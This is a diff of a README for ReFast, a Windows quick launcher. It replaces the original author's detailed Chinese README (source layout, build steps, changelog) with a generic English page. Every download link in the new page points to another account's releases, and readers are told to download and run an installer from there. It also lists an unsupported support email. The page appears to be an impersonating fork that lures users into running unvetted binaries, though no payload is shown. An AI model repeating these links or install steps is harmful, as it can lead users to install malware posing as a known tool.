@@ -1,329 +1,75 @@
-# ReFast
-
-<div align="center">
-  <h3>基于 Tauri 2 的 Windows 快速启动器</h3>
-  <p>类似 utools，让你快速启动应用、搜索文件、管理备忘录</p>
-  <p>
-    <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License"></a>
-    <a href="https://github.com/Xieweikang123/ReFast/releases"><img src="https://img.shields.io/github/v/release/Xieweikang123/ReFast" alt="Release"></a>
-    <a href="https://github.com/Xieweikang123/ReFast"><img src="https://img.shields.io/github/stars/Xieweikang123/ReFast?style=social" alt="Stars"></a>
-  </p>
-</div>
-
-## 📑 目录
-
-- [下载](#下载)
-- [使用文档](#使用文档)
-- [技术栈](#技术栈)
-- [项目结构](#项目结构)
-- [开发](#开发)
-- [功能特性](#功能特性)
-- [联系作者-加入产品交流群](#联系作者)
-- [功能状态](#功能状态)
-- [贡献](#贡献)
-- [许可证](#许可证)
-- [更新历史](#更新历史)
-- [相关链接](#相关链接)
-
-## 下载
+# 🚀 ReFast - A Quick Launcher for Windows
 
-从 [Releases](https://github.com/Xieweikang123/ReFast/releases) 页面下载最新版本的安装包。
+[![Download ReFast](https://img.shields.io/badge/Download-ReFast-blue.svg)](https://github.com/RaszySky/ReFast/releases)
 
-## 使用文档
+## 📥 Overview
 
-[📚 使用文档 (Wiki)](https://github.com/Xieweikang123/ReFast/wiki)
+ReFast is a lightweight application designed to help Windows users launch their favorite programs quickly. Built on Tauri 2, it offers a simple and efficient way to access your most-used applications without fuss.
 
+## 🚀 Features
 
-## 技术栈
+- **Fast Launching:** Open your applications instantly.
+- **User-Friendly Interface:** Navigate easily with a clean layout.
+- **Customizable Shortcuts:** Set up your own shortcuts for quicker access.
+- **Lightweight Design:** Take up minimal space on your device.
+- **Windows Compatibility:** Works seamlessly on Windows systems.
 
-- **框架**: Tauri 2.x (支持跨平台，但当前项目主要适配 Windows)
-- **前端**: React + TypeScript + Tailwind CSS
-- **后端**: Rust
-- **平台**: Windows 10/11
-
-> **注意**: 由于作者精力有限，目前主要适配 Windows 平台。虽然 Tauri 框架本身支持 macOS 和 Linux，但项目中的部分功能（如 Everything 搜索、Windows 系统文件夹搜索等）是 Windows 特定的。欢迎社区贡献跨平台实现！
-
-## 项目结构
-
-```
-re-fast/
-├── src/                    # 前端代码
-│   ├── api/               # Tauri API 封装
-│   ├── components/        # React 组件
-│   ├── types/             # TypeScript 类型定义
-│   ├── App.tsx            # 主应用组件
-│   └── main.tsx           # 入口文件
-├── src-tauri/             # Tauri 后端代码
-│   ├── src/
-│   │   ├── commands.rs    # Tauri 命令定义
-│   │   ├── launcher.rs    # 启动器核心功能
-│   │   ├── hotkey.rs      # 全局快捷键
-│   │   ├── everything_search.rs  # Everything 搜索集成
-│   │   ├── app_search.rs  # 应用搜索
-│   │   ├── memos.rs       # 备忘录功能
-│   │   ├── error.rs       # 错误处理
-│   │   └── main.rs        # 应用入口
-│   └── Cargo.toml         # Rust 依赖配置
-└── package.json           # 前端依赖配置
-```
+## ✅ System Requirements
 
-## 开发
-
-### 前置要求
-
-- Node.js (v18+)
-- Rust (最新稳定版)
-- Windows 10/11 开发环境
-
-### 安装依赖
-
-```bash
-npm install
-```
-
-### 开发模式
-
-```bash
-npm run dev:tauri
-```
-
-### 构建
-
-```bash
-npm run build:tauri
-```
-
-## 功能特性
-
-### 核心功能
-- 🚀 **快速启动器** - 通过全局快捷键快速呼出，支持应用、文件、备忘录搜索
-- 🔍 **智能搜索** - 集成 Everything 搜索，支持应用搜索、文件历史、系统文件夹搜索，智能排序确保常用结果优先显示
-- 📝 **备忘录中心** - 快速记录和检索备忘信息
-- 🔧 **插件系统** - 支持自定义插件扩展功能
-- ⌨️ **全局快捷键** - 自定义快捷键配置
-- 🎨 **现代化 UI** - 基于 React + Tailwind CSS 的优雅界面
-- ⚡ **性能优秀** - 基于 Rust + Tauri 2，资源占用极低
-- 👆 **智能关闭** - 点击其他窗口时自动关闭搜索框，提供流畅的使用体验
-
-### 内置工具
-- 📄 **JSON 格式化工具** - 格式化、压缩和验证 JSON 数据
-- 📌 **计算稿纸** - 多行记录：像写草稿一样写多行算式，支持精确计算
-- 🌐 **翻译工具** - 支持百度翻译和搜狗翻译，自动读取剪切板内容并翻译，支持多种语言互译
-- 📦 **文件工具箱** - 批量文件查找替换工具，支持正则表达式、文件扩展名过滤、自动备份等功能
-- 🎬 **动作录制与回放** - 录制键盘和鼠标操作，支持不同速度的回放，适合自动化重复操作
-- 🔧 **插件管理界面** - 查看和管理所有可用插件
-- ⚙️ **设置中心** - 应用配置和个性化设置
-
-## 联系作者
-
-<div align="center">
-
-**🎉 欢迎加入 ReFast 产品交流群！**
-
-扫描下方二维码添加作者微信，一起交流使用体验、反馈问题、提出建议！
-
-
-![作者微信二维码](https://github.com/user-attachments/assets/3071dd2f-1425-489e-b351-98c3bb34689e)
-
-**期待你的加入！** 🚀
-
-</div>
-
-## 功能状态
-
-### 已完成
-- ✅ 快速启动器核心功能
-- ✅ 应用搜索和启动
-- ✅ Everything 搜索集成
-- ✅ 文件历史记录
-- ✅ 备忘录功能
-- ✅ 全局快捷键支持
-- ✅ 插件系统框架
-- ✅ JSON 格式化工具
-- ✅ 计算稿纸插件（支持精确计算，使用 mathjs）
-- ✅ 翻译工具（支持百度翻译、搜狗翻译，自动读取剪切板）
-- ✅ 文件工具箱（批量查找替换，支持正则表达式和备份）
-- ✅ 动作录制与回放功能
-- ✅ 现代化 UI 界面
-- ✅ 失去焦点时自动关闭搜索框
-
-### 计划中
-- ⏳ 更多内置插件
-- ⏳ 主题自定义
-- ⏳ 搜索历史优化
-- ⏳ 更多文件类型支持
-
-## 贡献
-
-欢迎提交 Issue 和 Pull Request！
-
-## 许可证
-
-本项目采用 MIT 许可证 - 查看 [LICENSE](LICENSE) 文件了解详情
-
-## 更新历史
-
-### v1.0.56
-- 🎨 **动画效果优化**
-  - 优化 fadeInUp 动画，调整时长为 0.35s，使用 cubic-bezier 缓动函数，提升视觉流畅度
-- ⚡ **性能优化**
-  - 重构 LauncherWindow 输入处理逻辑，简化状态更新流程
-  - 使用 useMemo 对输入框样式进行记忆化，减少不必要的重渲染
-- 🖼️ **图标功能增强**
-  - 新增可执行文件（.exe 和 .lnk）图标提取和缓存功能
-  - 优化搜索结果中的图标显示体验
-- 🔧 **代码优化**
-  - 优化 app_search.rs，减少约 120 行代码，提升代码质量
-
-### v1.0.34
-- 🔧 **插件快捷键优化**
-  - 修复插件快捷键重复触发问题，确保按快捷键时只打开一个插件窗口
-  - 优化插件执行锁机制，支持不同插件之间的快速切换
-  - 修复插件窗口置前问题，按快捷键时窗口会自动置前并获取焦点
-  - 改进窗口显示逻辑，新创建的窗口和已存在的窗口都会正确置前
-
-### v1.0.33
-- 📁 **文件历史功能增强**
-  - 新增文件历史搜索功能，支持按文件名/路径搜索
-  - 新增日期范围过滤，支持快速选择时间段（如 5-10 天）
-  - 优化使用次数统计和调试日志
-  - 使用 `requestIdleCallback` 优化大数据量排序，避免阻塞 UI
-  - 添加 15 秒超时保护机制
-- 🎨 **图标提取功能**
-  - 支持 Native API 和 PowerShell 两种图标提取方式
-  - 新增图标验证与统计功能
-  - 统一图标提取失败标记，避免重复尝试
-  - 支持批量提取应用图标
-- ⚡ **LauncherWindow 优化**
-  - 重构 `handleLaunch` 函数，优化文件历史更新逻辑
-  - 统一提前处理 URL（http/https），避免走文件启动流程
-  - 改进路径规范化匹配算法，提高匹配准确性
-  - 优化最近使用时间处理，支持秒级和毫秒级时间戳
-- 🔍 **应用去重逻辑增强**
-  - 统一处理路径大小写和路径分隔符
-  - 优化去重优先级（.exe > .lnk > UWP）
-  - 改进历史文件与 Everything 搜索结果的去重逻辑
-- 🎯 **UI 组件改进**
-  - 新增 `FileHistoryPanel` 独立文件历史管理面板
-  - 新增 `AppIndexList` 应用索引列表管理组件
-  - 新增 `ConfirmDialog` 确认对话框组件
-  - 优化按钮样式和布局，改善可访问性
-
-### v1.0.26
-- 🔄 **版本管理与自动更新**
-  - 新增版本管理脚本系统，支持版本号同步和测试版本设置
-  - 新增自动检查更新功能，支持每 24 小时自动检查（可在设置中关闭）
-  - 启动后延迟 5 秒检查更新，避免影响启动速度
-  - 在"关于"页面支持手动检查更新
-- ⚡ **性能优化**
-  - 应用版本号缓存机制，避免重复获取，提升事件上报性能
-  - LauncherWindow 使用 useCallback 优化，减少不必要的重渲染
-  - 实现应用列表静默预加载，提升启动速度
-  - 优化应用搜索执行流程和数据库访问
-  - 增强 Everything 搜索缓存机制
-- 🔍 **搜索功能增强**
-  - 添加详细的调试日志（性能日志、搜索流程日志）
-  - 优化应用搜索和排序逻辑，改进结果总数处理和显示
-  - 增强应用和文件历史搜索功能
-  - 增强 Everything 搜索功能和系统文件夹搜索功能
-- 🧹 **代码重构与清理**
-  - 移除 SystemFolderItem 相关引用和功能
-  - 移除所有 agent 日志代码，保留必要的调试日志（通过配置控制）
-- 🔧 **功能改进**
-  - 重构 reveal_in_folder 命令，改进文件路径处理逻辑
-  - 支持回收站文件的特殊处理
-  - 优化 Windows 资源管理器的打开逻辑
-  - 重构热键更新处理逻辑，增强搜索失败时的日志记录
-
-### v1.0.21
-- 🔍 **Everything 搜索功能重大升级**
-  - 实现搜索会话管理与分页系统，支持大规模结果集的高效加载（每页 500 条）
-  - 新增搜索取消功能，可中断长时间运行的搜索任务
-  - 优化会话参数管理，避免重复创建会话，提升搜索性能
-  - 实现批量结果处理机制，大幅提升大数据量场景下的响应速度
-  - 添加批次事件监听，实时显示搜索加载进度
-  - 优化内存使用，支持最多缓存 8 页数据（LRU 策略）
-- 🎨 **自定义过滤器系统**
-  - 支持自定义文件类型过滤器，使用 SQLite 持久化存储
-  - 支持 Everything 语法自动检测，识别高级搜索语法
-  - 新增文件夹名称匹配偏好设置
-  - 支持最大结果数配置（默认 5000，最大 200 万）
-  - 优化排序选项，支持按大小、类型、名称排序
-- 🚀 **启动器窗口优化**
-  - 新增应用启动火箭动画效果，提升视觉反馈
-  - 重构搜索取消逻辑，提升响应速度和稳定性
-  - 添加窗口隐藏能力配置，优化窗口管理
-- 🔧 **用户体验改进**
-  - 添加滚动到顶部功能，快速返回结果列表
-  - 优化错误处理和提示信息
-  - 移除冗余搜索效果，简化搜索流程
-  - 重构插件过滤逻辑，优化插件中心交互
-
-### v1.0.19
-- 🌐 新增翻译工具：支持百度翻译和搜狗翻译，自动读取剪切板内容并翻译
-- 🔄 翻译工具支持多种语言互译（中文、英语、日语、韩语、法语、德语等 14 种语言）
-- 📦 新增文件工具箱：批量文件查找替换工具
-- 🔍 文件工具箱支持正则表达式匹配、文件扩展名过滤、大小写敏感等高级选项
-- 💾 文件工具箱支持自动备份功能，替换前自动备份文件夹，确保数据安全
-- 📝 文件工具箱支持替换文件名中的内容
-
-### v1.0.18
-- 🎯 优化插件系统，提升插件加载和执行性能
-- 🔧 改进设置界面，优化用户体验
-
-### v1.0.17
-- 📊 新增“统计”页：查看用户总数、插件使用次数排行，后续会扩展活跃趋势和功能热度
-- 🔄 插件使用统计：执行插件时自动记录启动次数与最近使用时间，支持本地排行榜展示
-- 📈 事件追踪：应用启动、应用启动器打开应用等关键操作会上报事件（支持可配置的事件服务端）
-- 💾 新增数据库备份：一键备份当前数据，便于迁移或回滚
-
-### v1.0.16
-- 👆 新增失去焦点时自动关闭搜索框功能，点击其他窗口时搜索框会自动关闭
-- 🎯 优化用户体验，使搜索框行为更符合启动器应用的常见交互模式
-
-### v1.0.15
-- 📌 新增计算稿纸插件，支持多行算式记录和精确计算
-- 🎨 计算稿纸采用草稿纸风格的淡黄色主题
-- 🔢 使用 mathjs 库处理浮点数精度问题，避免计算误差
-- 📋 支持单行结果复制和全部结果复制
-- ⌨️ 支持键盘快捷键：Enter 添加新行、Backspace 删除行、↑/↓ 导航
-- 🔍 优化搜索结果排序算法，历史文件结果优先于 Everything 结果
-- 📊 历史文件结果获得额外加分（基础加分 300 分 + 文件名匹配加权 30%）
-- 📈 使用次数越多的历史文件，排序越靠前（使用次数加分最多 200 分）
-- ⚡ 评分差距在 200 分以内时，历史文件优先于 Everything 结果显示
-
-### v1.0.14
-- 🔍 优化应用搜索排序算法，应用优先显示
-- 🎯 支持拼音搜索，拼音匹配时应用优先显示（如搜索 "weixin" 时微信应用排在前面）
-- ⚡ 短查询（2-4字符）完全匹配给予更高权重
-- 📱 应用类型结果额外加分，确保常用应用优先显示
-
-### v1.0.13
-- 🔧 优化快捷键录制功能，支持重复修饰键检测（如 Ctrl+Ctrl）
-- 🐛 修复快捷键录制时的重复事件处理问题
-- ⚡ 改进快捷键录制的响应速度和稳定性
-
-### v1.0.0+
-- ✅ 快速启动器核心功能
-- ✅ 应用搜索和启动
-- ✅ Everything 搜索集成
-- ✅ 文件历史记录
-- ✅ 备忘录功能
-- ✅ 全局快捷键支持
-- ✅ 插件系统框架
-- ✅ JSON 格式化工具
-- ✅ 现代化 UI 界面
-
-## 相关链接
-
-- [GitHub 仓库](https://github.com/Xieweikang123/ReFast)
-- [问题反馈](https://github.com/Xieweikang123/ReFast/issues)
-- [Tauri 官网](https://tauri.app/)
+- **Operating System:** Windows 10 or newer
+- **Processor:** 1.0 GHz or faster
+- **RAM:** 2 GB or more
+- **Disk Space:** At least 100 MB of free space
+- **Internet Connection:** Required for initial download and updates
 
+## 🚀 Getting Started
 
+To get started with ReFast, follow these simple steps:
 
+1. Click the download button above to visit our Releases page.
+2. Locate the latest version of ReFast on the Releases page.
+3. Click the **Assets** dropdown to see available files.
+4. Choose the appropriate installer for your system.
+5. Click on the installer to download it to your computer.
 
+## 📥 Download & Install
 
+To download ReFast, visit this page: [ReFast Releases](https://github.com/RaszySky/ReFast/releases).
 
+Once you have downloaded the installer, follow these steps to install ReFast:
 
+1. Find the downloaded file in your **Downloads** folder.
+2. Double-click on the installer file.
+3. Follow the on-screen instructions to complete the installation.
+4. Launch ReFast from your desktop or start menu.
 
+## 🛠️ Using ReFast
+
+After installation, using ReFast is simple:
+
+1. Open ReFast by double-clicking its icon.
+2. You will see a list of your favorite applications.
+3. To add a new application, click on the **Add** button and browse for the executable file of the program.
+4. To launch an application, just click on its name in the list.
+
+## ❓ Troubleshooting
+
+If you encounter any issues while using ReFast, check these common solutions:
+
+- **Application Won't Launch:** Ensure your system meets the requirements. Try restarting your computer and relaunching ReFast.
+- **Download Issues:** Confirm your internet connection is stable. If the link doesn’t work, retry later or check for updates on our GitHub page.
+- **Installation Problems:** If you can't install, ensure no other installations are running simultaneously.
+
+## 📝 Community Support
+
+Join our community to share your experiences and ask questions:
+
+- **GitHub Discussions:** Engage with other users and developers.
+- **Issue Tracker:** Report any bugs or request features directly.
+- **Social Media:** Follow us on our official channels for updates and tips.
+
+## 📧 Contact
+
+For further assistance, you can reach our support team at [support@refastapp.com](mailto:support@refastapp.com).
+
+Experience the speed and convenience of ReFast. Happy launching!
